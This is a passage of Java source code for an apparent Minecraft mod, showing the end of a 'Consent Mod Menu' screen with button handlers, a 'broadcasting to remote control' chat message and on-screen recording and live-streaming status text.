                    if (MinecraftClient.getInstance().player != null) {
                        MinecraftClient.getInstance().player.sendMessage(Text.of("\u00a7a[Live Stream] Started - Broadcasting to Remote Control"), false);
                    }
                }
                this.close();
            }).dimensions(centerX - 100, startY + 60, 200, 20).build());

            this.addDrawableChild(ButtonWidget.builder(Text.of("Close"), button -> {
                this.close();
            }).dimensions(centerX - 100, startY + 90, 200, 20).build());
        }

        @Override
        public void render(DrawContext context, int mouseX, int mouseY, float delta) {
            super.render(context, mouseX, mouseY, delta);
            context.drawCenteredTextWithShadow(this.textRenderer, Text.of("Consent Mod Menu"), this.width / 2, this.height / 2 - 80, 0xFFFFFF);
            if (recording) {
                context.drawCenteredTextWithShadow(this.textRenderer, Text.of("\u00a7cRecording... (" + frames.size() + " frames)"), this.width / 2, this.height / 2 - 65, 0xFF5555);
            }
            if (liveStreaming) {
                context.drawCenteredTextWithShadow(this.textRenderer, Text.of("\u00a7aLIVE STREAMING: Active (" + resolveUsername() + ")"), this.width / 2, this.height / 2 - 55, 0x55FF55);
            }
        }

        @Override
        public boolean shouldPause() {
            return false;
        }
    }
}
